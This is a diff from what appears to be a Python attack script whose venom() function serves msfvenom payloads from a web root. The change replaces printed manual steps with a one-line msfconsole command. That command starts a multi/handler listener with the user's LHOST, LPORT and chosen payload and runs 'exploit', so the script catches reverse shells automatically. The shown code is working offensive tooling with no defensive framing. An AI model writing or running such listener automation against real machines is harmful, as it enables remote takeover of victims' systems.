@@ -190,13 +190,10 @@ def venom():
     os.system(f"rm /var/www/html/{name}")
     msf=input("do you want to start listener/Metasploit?[y/n]: ")
     if msf=="y" or msf=="Y":
-         print("ENTER THE BELOW COMMANDS ONE BY ONE IN METASPLOIT")
-         print("command1 : use exploit/multi/handler")
-         print("command2 : set payload <YOUR PAYLOAD >")
-         print(f"command3 : set LHOST {lhost}")
-         print(f"command4 : set LPORT {lport}")
+         msfp=input("ENTER THE NAME OF THE PAYLOAD YOU WANNA LISTEN : ")
+         print("STARTING METASPLOIT METERPRETER FOR YOUR PAYLOAD....")
          os.system("service postgresql start")
-         os.system("msfconsole")
+         os.system(f"msfconsole -x 'use multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {msfp}; exploit'")
     else:
          print("EXITING.....BYE BYE>>>>")
          os.system("exit")
